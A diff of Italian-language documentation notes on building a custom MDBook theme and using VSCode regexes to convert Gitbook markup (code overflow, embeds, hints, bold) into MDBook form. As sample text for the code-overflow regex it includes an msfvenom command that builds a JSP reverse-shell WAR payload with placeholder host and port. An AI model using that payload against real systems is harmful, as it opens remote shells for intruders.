@@ -26,6 +26,60 @@ bundle exec jekyll serve --livereload
 
 ## MDBook
 
+### Tema custom
+
+Creare un tema custom con il comando:
+
+```bash
+mkdir -p EasiestSoft.com/tmp
+cd EasiestSoft.com/tmp
+mdbook init --theme
+
+tree.com //F
+
+│   book.toml
+│
+├───book
+└───src
+    │   chapter_1.md
+    │   SUMMARY.md
+    │
+    └───theme
+        │   book.js
+        │   favicon.png
+        │   highlight.css
+        │   highlight.js
+        │   index.hbs
+        │
+        └───css
+                chrome.css
+                general.css
+                print.css
+                variables.css    
+
+mv src/theme path/to/your/book/root/mytheme
+cd ..
+rm -rf tmp
+```
+
+Aggimungere il tema custom al file `book.toml`:
+
+```toml
+[output.html]
+theme = "mytheme"
+```
+
+Aggiungere eventuale css o js custom, dopo aver creato nella root le cartelle `css` e `js`, al file index.hbs:
+
+```html
+[...]
+<link rel="stylesheet" href="css/custom.css">
+[...]
+<script src="js/custom.js"></script>
+[...]
+```
+
+
 ### Modifiche
 Alcuni siti non sono stati progettati con MDBook ma ad esempio con Gitbook.
 Per convertirli in MDBook è necessario:
@@ -57,6 +111,41 @@ Per convertirli in MDBook è necessario:
     [$1]($2)
     ```
 
+    Poi modifica l'estensione `.md`:
+    ```
+    \[(.+?)\.md\]\((.+?)\/(.+?)\.md\) -> [$1]($2/$3.md)
+    ```
+
+#### CODE OVERFLOW
+- Regex per individuare gli `code overflow` e modificare come da esempio:
+
+    ```
+    {% code overflow="wrap" %}
+        ```bash
+        msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+        ```
+    {% endcode %}
+    ```
+
+    in
+
+    ```markdown
+        ```bash
+        msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+        ```
+    ```
+
+    Regex vsc:
+    ```
+    \{%[\s]*code[\s]+overflow="wrap"[\s]*%\}\n([\s\S]*?)\n\{%[\s]*endcode[\s]*%\}
+    ```
+
+    E stringa per la sostituzione
+    ```
+    $1
+    ```
+
+
 #### EMBEDED
 
 - Regex per individuare gli `embeded` e modificare come da esempio:
@@ -67,8 +156,8 @@ Per convertirli in MDBook è necessario:
 
     in
 
-    ```markdown
-    [lolbas-project.github.io](https://lolbas-project.github.io)
+    ```html
+    <a href="https://lolbas-project.github.io" class="embed-url">https://lolbas-project.github.io</a>
     ```
 
     Regex per la ricerca tramite VSCode
@@ -79,7 +168,7 @@ Per convertirli in MDBook è necessario:
 
     E stringa per la sostituzione
     ```
-    [$1]($1)
+    <a href="$1" class="embed-url">$1</a>
     ```
 
 #### HINT
@@ -98,6 +187,7 @@ Per convertirli in MDBook è necessario:
 
     ```markdown
     <div class='notice notice-info'>
+    <b>INFO</b></br>
     Lorem ipsum dolor sit amet, consectetur adipiscing elit.
     In hac habitasse platea dictumst.
     </div>
@@ -112,7 +202,7 @@ Per convertirli in MDBook è necessario:
     E stringa per la sostituzione
 
     ```
-    <div class='notice notice-$1'>
+    <div class='notice notice-$1'><b>\U$1</b></br>
     $2
     </div>\n
     ```
@@ -147,6 +237,44 @@ Per convertirli in MDBook è necessario:
         border-left: 15px solid #00cd41;
         background-color: rgb(155, 255, 155);
     }
+    ```
+
+### Bold
+
+- Regex per individuare i `bold` e modificare come da esempio:
+
+    ```markdown
+    **bold**
+    ```
+
+    in
+
+    ```html
+    <b>bold</b>
+    ```
+
+    Regex per la ricerca tramite VSCode
+
+    ```
+    \*\*(.*?)\*\*
+    ```
+
+    E stringa per la sostituzione
+
+    ```
+    <b>$1</b>
+    ```
+
+    Successivamente, per ripristinare il grassetto del link:
+    
+    ```
+    \[\s*<b>(.*?)<\/b>\s*\]\((.*?)\)
+    ```
+
+    E stringa per la sostituzione
+
+    ```
+    [$1]($2)
     ```
 
 ### Comandi utili
